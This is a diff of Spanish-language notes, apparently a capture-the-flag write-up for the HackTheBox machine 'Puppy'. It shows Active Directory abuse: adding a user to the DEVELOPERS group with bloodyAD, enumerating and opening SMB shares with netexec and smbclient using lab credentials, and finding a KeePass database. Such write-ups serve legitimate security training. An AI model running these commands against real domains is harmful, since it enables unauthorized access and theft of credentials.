@@ -124,8 +124,12 @@ Para ver la explotación de `GenericWrite` le hacemos clic y en Linux Abuse, nos
 También podemos añadir el usuario al grupo **DEVELOPERS** con la herramioenta [[BLOODYAD]]
 `bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`
 
-Como nos hemos añadido al grupo **DEVELOPERS** volvemos a acceder al **SMB** y tendremos acceso a la carpeta compartida **DEV**
+Como nos hemos añadido al grupo **DEVELOPERS** volvemos a enumerar el **SMB** 
 `netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `
+
+Veremos que hemos ganado acceso a la carpeta **DEV**, asi que nos metemos en modo interactivo para ver que contiene esta carpeta usando [[SMBCLIENT]]
+`smbclient //$IP/DEV -U 'levi.james'`
+
 
 Nos encontramos que en el directorio hay un archivo con extensión de *keepass* `kdbx` 
 `recovery.kdbx`
